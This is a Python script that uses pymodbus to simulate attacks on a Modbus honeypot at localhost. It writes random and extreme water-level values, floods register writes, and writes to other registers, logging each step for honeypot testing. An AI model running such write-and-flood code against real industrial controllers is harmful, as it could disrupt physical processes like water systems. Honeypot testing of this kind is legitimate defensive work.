from pymodbus.client.sync import ModbusTcpClient
import random
import time
import logging

# ----------------- Attack Configuration ------------------
target_ip = '127.0.0.1'  # Change this to the IP address of your honeypot
target_port = 5020
slave_id = 0
register_address = 0  # Water level register address

# ----------------- Logging Setup ------------------
logging.basicConfig(
    filename="honeypot_log.txt",  # Use the same file as the honeypot
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)

# ----------------- Realistic Attack Simulation ------------------
def realistic_attack():
    client = ModbusTcpClient(target_ip, port=target_port)
    
    if not client.connect():
        print(f"Failed to connect to {target_ip}:{target_port}")
        return

    # Attack Loop
    for _ in range(10):  # Simulating a few rounds of attacks
        # 1. Attack by sending random values to the water level
        new_level = random.randint(10, 100)  # Random water level between 10% and 100%
        print(f"Attacking... Setting water level to {new_level}%")
        client.write_register(register_address, new_level, unit=slave_id)
        logging.info(f"Sent write request: water level set to {new_level}%")
        
        # 2. Attack by sending extreme values to trigger alarm (simulate high water level alarm)
        if new_level > 90:
            print(f"[ALERT] Attacker set water level to {new_level}% (High Alarm Triggered)")
            logging.warning(f"High water level detected: {new_level}% - Potential Alarm Trigger")
        
        # 3. Flood with multiple requests at a high rate
        for _ in range(5):
            flood_level = random.randint(10, 100)  # Random flood level
            print(f"Flooding attack... Setting water level to {flood_level}%")
            client.write_register(register_address, flood_level, unit=slave_id)
            logging.info(f"Flood attack: water level set to {flood_level}%")
            time.sleep(0.1)  # High rate attack
        
        # 4. Attempt to write invalid data to registers (simulate invalid attack)
        invalid_register = random.randint(1, 100)  # Random invalid register
        print(f"Sending invalid register write to {invalid_register}")
        client.write_register(invalid_register, random.randint(0, 255), unit=slave_id)
        logging.info(f"Attempted to write to invalid register {invalid_register}")
        
        # Sleep for a bit before the next attack cycle
        time.sleep(2)

    client.close()

if __name__ == "__main__":
    print("[ATTACK] Starting a realistic attack on Modbus honeypot...")
    realistic_attack()
